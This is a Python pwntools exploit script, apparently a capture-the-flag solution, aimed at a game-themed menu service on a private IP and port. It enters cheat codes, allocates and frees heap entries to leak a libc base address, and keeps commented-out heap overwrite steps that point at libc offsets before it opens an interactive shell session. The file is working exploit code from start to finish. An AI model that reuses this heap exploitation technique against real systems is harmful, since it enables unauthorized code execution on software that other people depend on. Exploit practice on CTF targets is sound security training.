from pwn import *

HOST = "192.168.11.211"
PORT = 5959
REMOTE = 1
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('192.168.33.10',PORT)
def cheat(dat):
  s.recvuntil('>>')
  s.sendline('9999')
  s.recvuntil(':')
  s.sendline(dat)
def pro(index, dat):
  s.recvuntil('>>')
  s.sendline('1')
  s.recvuntil('>>')
  s.sendline(str(index))
  s.recvuntil('Name:')
  s.send(dat)
def remove(index):
  s.recvuntil('>>')
  s.sendline('2')
  s.recvuntil(':')
  s.sendline(str(index))
  s.recvuntil('?')
  s.sendline('yes')
s.recvuntil('>>')
s.sendline('1')
s.recvuntil('ID:')
s.sendline('PWND')
s.recvuntil('PW:')
s.sendline('PWND')
s.recvuntil('>>')
s.sendline('2')
s.recvuntil('>>')
s.sendline('1')
s.recvuntil('>>')
s.sendline('1')
s.recvuntil('>>')
s.sendline('3')

cheat('showmethemoney')
cheat('OperationCWAL')

for i in range(9):
  pro(5,"AAAA")

for i in range(8):
  remove(i)
s.recvuntil('>>')
s.sendline('3')
libc = u64(s.recvuntil('>>')[0x2b7:0x2b7+6]+'\x00\x00') - 0x3dac78#0x3c4b78
print "LIBC : ", hex(libc)
#pro(3,"dum")
#pro(3,"dum")
#pro(2,"medic")
#pro(2,"medic")
#pro(3,"dum")
#pro(3,"dum")
#remove(4)
#remove(5)
#pro(3,"dum")
#remove(4)
'''
pro(2,p64(libc+0x3dac45))
pro(2,p64(0xdeadbeef))
pro(2,p64(0xdeadbeef))
pro(4,"1234")
remove(12)
remove(0)
pro(2,"A"*35+p64(libc+0x3dac00))
pro(5,p64(libc+0x47c46))
'''
s.interactive()
